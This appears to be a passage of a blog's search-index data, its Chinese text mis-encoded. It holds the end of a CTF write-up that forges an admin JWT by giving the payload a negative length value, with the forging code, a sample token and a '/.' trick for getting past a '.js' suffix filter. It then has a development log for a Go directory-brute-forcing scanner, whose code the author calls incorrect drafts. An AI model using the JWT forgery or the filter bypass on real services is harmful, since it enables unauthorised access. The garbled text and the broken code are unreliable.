çš„å‡½æ•°ï¼Œå‘ç°æœŸæœ›çš„å“ˆå¸Œå€¼æ˜¯é€šè¿‡æˆ‘ä»¬ä¼ å…¥çš„ header å’Œ payloadï¼ŒåŠ ä¸ŠæœåŠ¡å™¨ç”Ÿæˆçš„ secret è®¡ç®—å‡ºæ¥çš„ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æ§åˆ¶ payload ä¸­çš„ length å±æ€§ï¼Œå°†å…¶æ”¹ä¸ºä¸€ä¸ªç‰¹æ®Šè´Ÿå€¼(header çš„é•¿åº¦åŠ ä¸Š secret é•¿åº¦å–è´Ÿ )ï¼Œè¿™æ ·å°±èƒ½æŠŠ secret çš„å½±å“æ¶ˆé™¤ï¼Œå³æ— è®º secret æ˜¯ä»€ä¹ˆï¼Œæˆ‘ä»¬æ„é€ çš„ payload ç”Ÿæˆçš„ jwt éƒ½èƒ½é€šè¿‡æ£€æŸ¥ï¼Œæ³¨æ„æ„é€ çš„é•¿åº¦ len=-(JSON.stringify(header).length+18)\nconst signJWT = (payload, &#123; expiresIn &#125; = &#123;&#125;, secret = JWT_SECRET) =&gt; &#123;    const header = &#123; alg: &#x27;HS256&#x27;, typ: &#x27;JWT&#x27; &#125;;    const now = Math.floor(Date.now() / 1000);    console.log(payload)    const body = &#123; ...payload, length:payload.username.length,iat: now &#125;;    if (expiresIn) &#123;        body.exp = now + expiresIn;    &#125;    return [        toBase64Url(JSON.stringify(header)),        toBase64Url(JSON.stringify(body)),        sha256(...[JSON.stringify(header), body, secret])    ].join(&#x27;.&#x27;);&#125;;const header = &#123; alg: &#x27;HS256&#x27;, typ: &#x27;JWT&#x27; &#125;;const len=-(JSON.stringify(header).length+18);token=signJWT(&#123;username:&quot;admin&quot;,length:len&#125;,crypto.randomBytes(9).toString(&#x27;hex&#x27;))//token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwibGVuZ3RoIjotNDUsImlhdCI6MTc2MjE0MzU0MH0.674dcdbbb09261235ee8efc1999daee725dad0ec314a8d1d80cb11229e7596c1\n\næœ‰äº† jwt æˆ‘ä»¬å¯ä»¥è¿›è¡Œåç»­æ“ä½œ\nå¯¹æ–‡ä»¶åç¼€å js è¿›è¡Œäº† wafï¼Œå¯ä»¥ç®€å•ä½¿ç”¨&#x2F;.ç»•è¿‡\n","tags":["CTF"]},{"title":"vidar-scanå¼€å‘æ—¥å¿—-1","url":"/2025/11/14/vidar-scan%E5%BC%80%E5%8F%91%E6%97%A5%E5%BF%97-1/","content":"æ–‡ç« ä¸­æ‰€æœ‰ä»£ç å‡ä¸æ­£ç¡®ï¼Œåˆç‰ˆä»£ç ï¼Œåªå±•ç°æƒ³æ³• ğŸ¤­åˆ›å»ºäº†è¯»å–æ–‡ä»¶çš„å‡½æ•° LoadFile.go\npackage loadfileimport(    &quot;bufio&quot;,    &quot;os&quot;,    &quot;basework/CheckErr&quot;,    &quot;fmt&quot;)func LoadFile2List(filename string) ([]string, error)&#123;    file, err := os.open(filename)    CheckErr(err)    file.close()    scanner := bufio.NewScanner(file)    var lines = []string    for scanner.Scan()&#123;        line := scanner.Text()        if line != &quot;&quot;&#123;            lines.append(line)        &#125;        if err := scanner.Err(); err != nil&#123;            return nil, fmt.Errorf(&quot;error: %v&quot;,err)        &#125;    &#125;    return lines, nil&#125;\n\nä¸»è¦ç”¨äºé€è¡Œè¯»å–å­—å…¸æ–‡ä»¶\nä¹‹åæ•´äº†ä¸ªæ£€æŸ¥ error çš„å‡½æ•° CheckError.go\npackage checkerrimport &quot;fmt&quot;import &quot;os&quot;func CheckErr(err error)&#123;    if err != nil&#123;        fmt.Sprintf(&quot;error: %v\\n&quot;,err)        os.Exit(1)    &#125;&#125;\n\nåŠŸèƒ½é¡¾åæ€ä¹‰\nä¹‹åæƒ³æ•´ä¸ªå‡½æ•°è‡ªå®š Transportï¼Œè®© http.client å¸¦ä¸Šæƒ³è¦çš„è¯·æ±‚å¤´ï¼Œè¿™ä¸ªæ“ä½œéœ€è¦è‡ªå®šä¸€ä¸ªç»“æ„å®ç° RoundTrip æ¥å£ï¼Œä¹‹åæ˜¯ç”¨æˆ‘ä»¬è‡ªå·±çš„ç»“æ„ä½“ä¼ å…¥ç»™ client çš„ Transportï¼Œå¼€å§‹æ˜¯è¿™ä¹ˆåšäº†ï¼Œä¹‹åå‘ç°é€»è¾‘å¤æ‚äº†ï¼Œæ„Ÿè§‰ä¸ç”¨è¿™ä¹ˆåšï¼ˆèµ·ç ç›®å‰æ²¡å‘ç°è¿™ä¹ˆåšçš„æ„ä¹‰ï¼‰\npackage clientimport(    &quot;net/http&quot;,    &quot;time&quot;)type HeaderTransport struct&#123;    header http.Header    base http.RoundTripper&#125;func (t *HeaderTransport) RoundTrip(req *http.Request) (*http.Response, error)&#123;    for key, value in range t.header&#123;        if req.Header.Get(key) == &quot;&quot;&#123;            for _, value1 in range value&#123;                req.Header.Add(key, value1)            &#125;        &#125;    &#125;    baseTranslt := t.base    if t.base == nil&#123;        baseTranslt := http.DefaultTransport    &#125;    return baseTranslt.RoundTrip.(req)&#125;func NewClient(header http.Header, timeout time.Duration) *http.Client&#123;&#125;\n\nold ä»£ç ï¼Œä¸èˆä½†æ˜¯å†è§\næ¢äº†ä¸ªé€»è¾‘ï¼Œç°åœ¨å†™äº†ä¸ªå‡½æ•°ç›´æ¥æ„é€  requestï¼Œå†åˆ›å»ºä¸ªå‡½æ•°ç”¨æ¥å‘é€è¯·æ±‚\npackage cgetreqimport(    &quot;net/http&quot;,    &quot;basework/checkerr&quot;)func CGETreq(finalpath string)(*http.Request, error)&#123;    req, err := http.NewRequest(&quot;GET&quot;, finalpath, nil)    checkerr.CheckErr(err)    req.Header.Set(&quot;User-Agent&quot;, &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 Edg/142.0.0.0&quot;)    return req, err&#125;\n\npackage sendmessimport(    &quot;fmt&quot;,    &quot;net/http&quot;,    &quot;basework/cgetreq&quot;)func SendMessage(client *http.Client, finalpath string)&#123;    req, err := cgetreq.CGETreq(finalpath)    if err != nil&#123;        fmt.Printf(&quot;[error]:%v\\n&quot;,err)        return    &#125;    rep, err = client.Do(req)    if err != nil&#123;        fmt.Printf(&quot;[error]:%v\\n&quot;,err)        return    &#125;    defer rep.Body.Close()    if rep.StatusCode != 404&#123;        fmt.Printf(&quot;[found] %-6d %s&quot;,rep.StatusCode, finalpath)    &#125;&#125;\n\næ˜¾ç„¶ç°åœ¨çš„è¯·æ±‚å¤´åªèƒ½å†™æ­»ï¼Œä¹‹åè€ƒè™‘åŠ¨æ€åŠ å…¥\nä¹‹åæ˜¯å¹¶å‘å‘é€è¯·æ±‚çš„å‡½æ•°ï¼Œè¿™é‡Œä½¿ç”¨äº† goroutineï¼Œå¯èƒ½ä¸æ˜¯æœ€å¿«çš„æ–¹æ³•ï¼Œä½†æ°´å¹³å°±åˆ°è¿™äº†ï¼Œä¹‹åè€ƒè™‘å†æ¢\npackage getscanimport(    &quot;fmt&quot;,    &quot;basework/loadfile&quot;,    &quot;basework/checkerr&quot;,    &quot;basework/urlconstruct&quot;,    &quot;basework/sendmess&quot;,    &quot;sync&quot;)func Getscan(url string, filename string)&#123;    finalpath := urlconstruct.UrlConstruct(url, filename)    client := &amp;http.Client&#123;        Timeout: 3 * time.Second,    &#125;    var wg sync.WaitGroup    ratelimit := 1000    limitch := make(chan struct&#123;&#125;, ratelimit)    fmt.Printf(&quot;-----START-----&quot;)    for _, url in range finalpath&#123;        limitch &lt;- struct&#123;&#125;&#123;&#125;        wg.Add(1)        go func(url string)&#123;            defer wg.Done()            defer func()&#123;&lt;-limitch&#125;()            sendmess.SendMessage(client, url)        &#125;(url)    &#125;    wg.Wait()    fmt.Printf(&quot;-----OVER-----&quot;)&#125;\n\nä½¿ç”¨ç©ºç»“æ„ä½“åˆ°ä¿¡é“çš„ç±»å‹ï¼Œä¸å ç”¨å¤šä½™å†…å­˜ï¼Œä»¥æ­¤é™åˆ¶å¹¶å‘é€Ÿç‡é¿å…ç›´æ¥å¹²çˆ†ç”µè„‘ï¼Œé€šè¿‡ goroutine å®ç°å¹¶å‘ï¼Œåˆ›å»ºä¸€ä¸ª sync çš„å¹¶å‘å·¥å…·ï¼Œwg.Wait()ç¡®ä¿æ‰€ç”¨è¿›ç¨‹ç»“æŸ\nåˆ°æ­¤ï¼Œä¸€ä¸ªç®€å•çš„æ‰«è·¯å¾„çš„å·¥å…·å¤§è‡´ä¹Ÿæ˜¯å®Œæˆäº†\nï¼ˆæ”¹è¿›è¡Œæ¯ç‡¥çš„ debug ç¯èŠ‚ï¼Œæµ‹è¯•è¿è¡Œæ˜¯å¦æ­£å¸¸ ğŸ˜­ï¼‰\n","tags":["golang","å¼€å‘"]}]